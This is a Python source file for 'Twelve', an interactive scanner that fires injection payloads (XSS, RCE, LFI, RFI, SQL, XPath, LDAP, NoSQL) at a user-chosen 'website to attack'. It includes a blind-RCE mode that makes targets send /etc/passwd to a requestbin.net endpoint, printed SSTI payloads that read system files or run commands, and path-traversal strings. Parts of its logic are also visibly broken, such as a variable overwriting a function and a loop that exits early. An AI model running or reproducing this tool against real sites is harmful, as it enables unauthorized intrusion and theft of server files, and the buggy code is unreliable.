import requests
import os
import sys
import time
import urllib.parse

header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1'}
def urldecode(s):
	return urllib.parse.unquote_plus(s)

def menu():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("[0] XSS scanner \n[1] RCE scanner \n[2] LFI scanner \n[3] RFI scanner \n[4] SQL scanner \n[5] XXE scanner \n[6] XPATH scanner \n[7] LDAP scanner \n[8] NoSQL scanner \n[9] SSTI scanner \n[10] Magic hashes array \n[11] PHP Serialization payloader \n[666] Sources\n")
	choice = int(input("> "))
	print("\n")
	if choice == 0:
		O()
	elif choice == 2:
		II()
	elif choice == 3:
		III()
	elif choice == 10:
		X()
	elif choice == 8:
		VIII()
	elif choice == 11:
		XI()
	elif choice == 4:
		IV() 
	elif choice == 9:
		IX()
	elif choice == 6:
		VI()
	elif choice == 1:
		I()
	elif choice == 7:
		VII()
	elif choice == 5:
		V()
	elif choice == 666:
		sixsixsix()
	else:
		print("Unknown choice")
		time.sleep(3)
		menu()

def VI():
	print("XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.")
	site = input("Website to attack (with the potentially vulnerable parameter last) > ")
	xpath = 0
	while xpath == 0:
		try:
			f = open("XPATH.txt", "r")
		except FileNotFoundError:
			print("Wordlist not found, you may reinstall Twelve.")
			time.sleep(3)
			menu()
		f = open("XPATH.txt", "r")
		l = 0
		for payload in f:
			if requests.get(site).text == requests.get(site + payload.rstrip(), headers=header).text:
				print("\nPotential XPATH found, payload > " + payload.rstrip() + " (response with payload equal to basic response)\n")
				rep = input("Would you like to restart Twelve ? (y/n) > ")
				menu() if rep == "y" else sys.exit(0)
			elif "evaluation failed" in requests.get(site + payload.rstrip(), headers=header).text:
				print("\nPotential XPATH found, payload > " + payload.rstrip() + " (response with payload equal to basic response)\n")
				rep = input("Would you like to restart Twelve ? (y/n) > ")
				menu() if rep == "y" else sys.exit(0)
			elif "SimpleXMLElement" in requests.get(site + payload.rstrip(), headers=header).text:
				print("\nPotential XPATH found, payload > " + payload.rstrip() + " (response with payload equal to basic response)\n")
				rep = input("Would you like to restart Twelve ? (y/n) > ")
				menu() if rep == "y" else sys.exit(0)
			else:
				l+=1
		print("No XPATH found.")
		rep = input("Would you like to restart Twelve ? (y/n) > ")
		menu() if rep == "y" else sys.exit(0)


def VII():
	print("LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements using a local proxy.")
	site = input("Website to attack (with the potentially vulnerable parameter last) > ")
	ldap = 0
	while ldap == 0:
		try:
			f = open("LDAP.txt", "r")
		except FileNotFoundError:
			print("Wordlist not found, you may reinstall Twelve.")
			time.sleep(3)
			menu()
		f = open("LDAP.txt", "r")
		l = 0
		for payload in f:
			if requests.get(site).text == requests.get(site + payload.rstrip(), headers=header).text:
				print("\nPotential LDAP found, payload > " + payload.rstrip() + " (response with payload equal to basic response)\n")
				rep = input("Would you like to restart Twelve ? (y/n) > ")
				menu() if rep == "y" else sys.exit(0)
			elif "LDAP syntax" in requests.get(site + payload.rstrip(), headers=header).text:
				print("\nPotential LDAP found, payload > " + payload.rstrip() + " (response with payload equal to basic response)\n")
				rep = input("Would you like to restart Twelve ? (y/n) > ")
				menu() if rep == "y" else sys.exit(0)
			else:
				l+=1
		print("No LDAP found.")
		rep = input("Would you like to restart Twelve ? (y/n) > ")
		menu() if rep == "y" else sys.exit(0)

def IX():
	print("Template injection allows an attacker to include template code into an existant (or not) template.")
	print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ \n+ Ruby                                 + Java                                                          + \n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ \n+ <%= 7 * 7 %>                         + ${7*7}                                                        + \n+ <%= File.open('/etc/passwd').read %> + ${{7*7}}                                                      + \n++++++++++++++++++++++++++++++++++++++++ ${class.getResource(\"../../../../../index.htm\").getContent()} + \n                                       + ${T(java.lang.System).getenv()}                               + \n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ \n+ Twig      + Smarty                + Freemarker                                                    + \n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ \n+ {{7*'7'}} + {php}echo `id`;{/php} + <#assign                                                      + \n+++++++++++++++++++++++++++++++++++++ ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"id\")} + \n                                    +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
	print("\nMore infos here: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections")

def III():
	print("Remote File inclusion (RFI) refers to an inclusion attack wherein an attacker can cause the web application to include a remote file by exploiting a web application that dynamically includes external files or scripts")
	site = input("Website to attack (with the potentially vulnerable parameter last & without value) > ")
	try:
		f = open("RFI.txt", "r")
	except FileNotFoundError:
		print("Wordlist not found, you may reinstall Twelve.")
		time.sleep(3)
		menu()
	f = open("RFI.txt", "r")
	l = 0
	for payload in f:
		payload = payload.rstrip()
		if "0wn3d" in requests.get(site + payload, headers=header).text and "php echo" not in requests.get(site + payload, headers=header):
			print("\nPotential RFI found, payload > " + payload + " (\"0wn3d\" returned in the response)\n")
			rep = input("Would you like to restart Twelve ? (y/n) > ")
			menu() if rep == "y" else sys.exit(0)
		else:
			l+=1
	print("No RFI found.")
	rep = input("Would you like to restart Twelve ? (y/n) > ")
	menu() if rep == "y" else sys.exit(0)

def II():
	def advanced(site, won):
		if won == "w":
			try:
				f = open("LFI.txt", "r")
			except FileNotFoundError:
				print("Wordlist not found, you may reinstall Twelve.")
				time.sleep(3)
				menu()
			f = open("LFI.txt", "r")
			l = 0
			for payload in f:
				payload = payload.rstrip()
				if requests.get(site + "fuckingpolyglots\"':/();:.457").text != requests.get(site + payload).text:
					print("\nPotential LFI found, payload > " + payload.rstrip() + " (different response)\n")
					rep = input("Would you like to restart Twelve ? (y/n) > ")
					menu() if rep == "y" else sys.exit(0)
				else:
					l+=1
			print("No LFI found.")
			rep = input("Would you like to restart Twelve ? (y/n) > ")
			menu() if rep == "y" else sys.exit(0)

		elif won == "n":
			if "root:x:0:0:root:/root:/bin/bash" in requests.get(site + "../../../../../../../../../../../../../../../../etc/passwd%00").text:
				print("\nPotential LFI found, payload > ../../../../../../../../../../../../../../../../etc/passwd%00 (/etc/passwd returned in the response)\n")

			elif "root:x:0:0:root:/root:/bin/bash" in requests.get(site + "%252e%252e%252fetc%252fpasswd").text:
				print("\nPotential LFI found, payload > %252e%252e%252fetc%252fpasswd (/etc/passwd returned in the response)\n")
				advanced = input("Would you like to load advanced tests ? (y/n)")
				advanced(site, "w") if advanced == "y" else sys.exit(0)
			elif "root:x:0:0:root:/root:/bin/bash" in requests.get(site + "%252e%252e%252fetc%252fpasswd%00").text:
				print("\nPotential LFI found, payload > %252e%252e%252fetc%252fpasswd%00 (/etc/passwd returned in the response)\n")
				advanced = input("Would you like to load advanced tests ? (y/n)")
				advanced(site, "w") if advanced == "y" else sys.exit(0)
			elif "root:x:0:0:root:/root:/bin/bash" in requests.get(site + "..///////..////..//////etc/passwd").text:
				print("\nPotential LFI found, payload > ..///////..////..//////etc/passwd (/etc/passwd returned in the response)\n")
				advanced = input("Would you like to load advanced tests ? (y/n)")
				advanced(site, "w") if advanced == "y" else sys.exit(0)
			else:
				print("No LFI found.")
				rep = input("Would you like to restart Twelve ? (y/n) > ")
				menu() if rep == "y" else sys.exit(0)

	print("The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a \"dynamic file inclusion\" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.")
	site = input("Website to attack (with the potentially vulnerable parameter last & without value) > ")
	if "root:x:0:0:root:/root:/bin/bash" in requests.get(site + "../../../../../../../../../../../../../../../../etc/passwd").text:
		print("\nPotential LFI found, payload > ../../../../../../../../../../../../../../../../etc/passwd (/etc/passwd returned in the response)\n")
		advanced = input("Would you like to load advanced tests ? (y/n)")
		advanced(site, "w") if advanced == "y" else sys.exit(0)
	else:
		print("\nNo LFI found.\n")
		advanced = input("Would you like to load advanced tests ? (y/n)")
		advanced(site, "n") if advanced == "y" else sys.exit(0)

def V():
	print("An XML External Entity attack is a type of attack against an application that parses XML input")
	print("https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing\nhttp://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html\nhttps://gist.github.com/staaldraad/01415b990939494879b4\nhttps://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870")
	rep = input("Would you like to restart Twelve ? (y/n) > ")
	menu() if rep == "y" else sys.exit(0)


def I():
	def rceblind(site, pog, params):
		if pog == "p":
			request = requests.post("http://requestbin.net/api/v1/bins", data={"private": "false"}).text.split("\"request_count\": 0, \"name\": \"")[1]
			requestbin = "http://requestbin.net/r/" + request.split("\", \"private\": false}")[0]
			try:
				f = open("RCE_blind.txt", "r")
			except FileNotFoundError:
				print("Wordlist not found, you may reinstall Twelve.")
				time.sleep(3)
				menu()
			f = open("RCE_blind.txt", "r")
			l = 0
			for payload in f:
				payload = payload.rstrip()
				requests.post(site, data={params: urldecode(payload.replace("{$inject}", requestbin))}, headers=header).text
				if "root:x:0:0:root:/root:/bin/bash" in requests.get(requestbin + "?inspect", headers=header).text:
					print("\nPotential RCE blind found, payload > " + payload.rstrip().replace("{$inject}", requestbin) + " (/etc/passwd returned in the response)\n")
					print("Link of the requestbin: " + requestbin + "?inspect\n")
					rep = input("Would you like to restart Twelve ? (y/n) > ")
					menu() if rep == "y" else sys.exit(0)
				else:
					l+=1
			print("No RCE found.")
			rep = input("Would you like to restart Twelve ? (y/n) > ")
			menu() if rep == "y" else sys.exit(0)
		elif pog == "g":
			request = requests.post("http://requestbin.net/api/v1/bins", data={"private": "false"}).text.split("{\"request_count\": 0, \"name\": \"")[1]
			requestbin = "http://requestbin.net/r/" + request.split("\", \"color\": [")[0]
			try:
				f = open("RCE_blind.txt", "r")
			except FileNotFoundError:
				print("Wordlist not found, you may reinstall Twelve.")
				time.sleep(3)
				menu()
			f = open("RCE_blind.txt", "r")
			l = 0
			for payload in f:
				payload = payload.rstrip()
				requests.get(site + payload.replace("{$inject}", requestbin), headers=header).text
				if "root:x:0:0:root:/root:/bin/bash" in requests.get(requestbin + "?inspect", headers=header).text:
					print("\nPotential RCE blind found, payload > " + payload.rstrip().replace("{$inject}", requestbin) + " (/etc/passwd returned in the response)\n")
					print("Link of the requestbin: " + requestbin + "?inspect\n")
					rep = input("Would you like to restart Twelve ? (y/n) > ")
					menu() if rep == "y" else sys.exit(0)
				else:
					l+=1
			print("No RCE found.")
			rep = input("Would you like to restart Twelve ? (y/n) > ")
			menu() if rep == "y" else sys.exit(0)
		else:
			print("Unknown choice")
			time.sleep(3)
			menu()
	print("Remote Commands execution is a security vulnerability that allows an attacker to execute Commands from a remote server.")
	param = input("POST or GET ? (p/g) > ")
	if param == "p":
		site = input("Website to attack > ")
		params = input("Potentially vulnerable parameter > ")
		try:
			f = open("RCE.txt", "r")
		except FileNotFoundError:
			print("Wordlist not found, you may reinstall Twelve.")
			time.sleep(3)
			menu()
		f = open("RCE.txt", "r")
		l = 0
		for payload in f:
			if "root:x:0:0:root:/root:/bin/bash" in requests.post(site, data={params: payload.rstrip()}, headers=header).text:
				print("\nPotential RCE found, payload > " + payload.rstrip() + " (/etc/passwd returned in the response)\n")
				rep = input("Would you like to restart Twelve ? (y/n) > ")
				menu() if rep == "y" else sys.exit(0)
			else:
				l+=1
		blind = input("No RCE found. Would you like to run blinds tests ? (y/n) > ")
		rceblind(site, param, params) if blind == "y" else sys.exit(0)

	elif param == "g":
		params = ""
		site = input("Website to attack (with the potentially vulnerable parameter last) > ")
		try:
			f = open("RCE.txt", "r")
		except FileNotFoundError:
			print("Wordlist not found, you may reinstall Twelve.")
			time.sleep(3)
			menu()
		f = open("RCE.txt", "r")
		l = 0
		for payload in f:
			if "root:x:0:0:root:/root:/bin/bash" in requests.get(site + payload.rstrip(), headers=header).text:
				print("\nPotential RCE found, payload > " + payload.rstrip() + " (input returned in the response)\n")
				rep = input("Would you like to restart Twelve ? (y/n) > ")
				menu() if rep == "y" else sys.exit(0)
			else:
				l+=1
		blind = input("No RCE found. Would you like to run blinds tests ? (y/n) > ")
		rceblind(site, param, params) if blind == "y" else sys.exit(0)
	else:
		print("Unknown choice")
		time.sleep(3)
		menu()




def VIII():
	print("NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.")
	site = input("Website to attack (with the potentially vulnerable parameter last, without value & add {$injection} between the parameter's name and the \"=\") > ")
	error = input("Error message > ")
	success = input("Success message > ")
	for j in range(128):
		site = site.replace('{$injection}', '[$regex]')
		print(site)
		page = requests.get(site + ".{"+str(j)+"}").text
		if success in page:
			print("Potential NoSQL found, payload > " + site + ".{"+str(j)+"} (blinds tests)")
			rep = input("Would you like to restart Twelve ? (y/n) > ")
			menu() if rep == "y" else sys.exit(0)
		else:
			print("No NoSQL found.")
			rep = input("Would you like to restart Twelve ? (y/n) > ")
			menu() if rep == "y" else sys.exit(0)



def IV():
	print("SQL injection is a code injection technique that might destroy a database. SQL injection is one of the most common web hacking techniques.")
	site = input("Website to attack (with the potentially vulnerable parameter last) > ")
	sql = 0
	while sql == 0:
		try:
			f = open("SQL_true.txt", "r")
		except FileNotFoundError:
			print("Wordlist not found, you may reinstall Twelve.")
			time.sleep(3)
			menu()
		f = open("SQL_true.txt", "r")
		l = 0
		for payload in f:
			if requests.get(site).text == requests.get(site + payload.rstrip(), headers=header).text:
				print("\nPotential SQL found, payload > " + payload.rstrip() + " (response with payload equal to basic response)\n")
				rep = input("Would you like to restart Twelve ? (y/n) > ")
				menu() if rep == "y" else sys.exit(0)
			elif "SQL syntax" in requests.get(site + payload.rstrip(), headers=header).text:
				print("\nPotential SQL found, payload > " + payload.rstrip() + " (response with payload equal to basic response)\n")
				rep = input("Would you like to restart Twelve ? (y/n) > ")
				menu() if rep == "y" else sys.exit(0)
			else:
				l+=1
		print("No SQL found.")
		rep = input("Would you like to restart Twelve ? (y/n) > ")
		menu() if rep == "y" else sys.exit(0)



def XI():
	print("PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.\n")
	cmd = input("PHP to serialize > ")
	result = requests.get('http://localhost/Twelve/ObjectInjection.php?cmd=' + cmd).text
	print("\n" + "Serialized + Url encoded output > " + result + "\n")
	rep = input("Would you like to restart Twelve ? (y/n) > ")
	menu() if rep == "y" else sys.exit(0)





def X():
	print("A loose comparison is one performed using two equals signs (==). It follows suit with the \"best-guess\" approach, which can lead to some unexpected results.")
	print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ \n++ Hash Type ++ Hash Length ++ Magic String ++ Magic Hashes                                     ++ \n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ \n++ md5       ++ 32          ++ 240610708    ++ 0e462097431906509019562988736854                 ++ \n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ \n++ sha1      ++ 40          ++ 10932435112  ++ 0e07766915004133176347055865026311692244         ++ \n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ \n++ ripemd128 ++ 32          ++ 315655854    ++ 0e251331818775808475952406672980                 ++ \n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ \n++ tiger128  ++ 32          ++ 265022640    ++ 0e908730200858058999593322639865                 ++ \n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\nMore Magic Hashes here: https://www.whitehatsec.com/blog/magic-hashes/\n")
	rep = input("Would you like to restart Twelve ? (y/n) > ")
	menu() if rep == "y" else sys.exit(0)






def O():
	print("Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.")
	param = input("POST or GET ? (p/g) > ")
	if param == "p":
		site = input("Website to attack > ")
		params = input("Potentially vulnerable parameter > ")
		try:
			f = open("XSS.txt", "r")
		except FileNotFoundError:
			print("Wordlist not found, you may reinstall Twelve.")
			time.sleep(3)
			menu()
		f = open("XSS.txt", "r")
		l = 0
		for payload in f:
			if payload.rstrip() in requests.post(site, data={params: payload.rstrip()}, headers=header).text:
				print("\nPotential XSS found, payload > " + payload.rstrip() + " (input returned in the response)\n")
				rep = input("Would you like to restart Twelve ? (y/n) > ")
				menu() if rep == "y" else sys.exit(0)
			else:
				l+=1
		print("No XSS found.")
		rep = input("Would you like to restart Twelve ? (y/n) > ")
		menu() if rep == "y" else sys.exit(0)

	elif param == "g":
		site = input("Website to attack (with the potentially vulnerable parameter last) > ")
		try:
			f = open("XSS.txt", "r")
		except FileNotFoundError:
			print("Wordlist not found, you may reinstall Twelve.")
			time.sleep(3)
			menu()
		f = open("XSS.txt", "r")
		l = 0
		for payload in f:
			if payload.rstrip() in requests.get(site + payload.rstrip(), headers=header).text:
				print("\nPotential XSS found, payload > " + payload.rstrip() + " (input returned in the response)\n")
				rep = input("Would you like to restart Twelve ? (y/n) > ")
				menu() if rep == "y" else sys.exit(0)
			else:
				l+=1
		print("No XSS found.")
		rep = input("Would you like to restart Twelve ? (y/n) > ")
		menu() if rep == "y" else sys.exit(0)
	else:
		print("Unknown choice")
		time.sleep(3)
		menu()

def sixsixsix():
	print("https://www.copterlabs.com/strict-vs-loose-comparisons-in-php/\nhttps://www.whitehatsec.com/blog/magic-hashes/\nhttps://github.com/swisskyrepo/PayloadsAllTheThings\nhttps://root-me.org/\nBrutelogic\n")
menu()
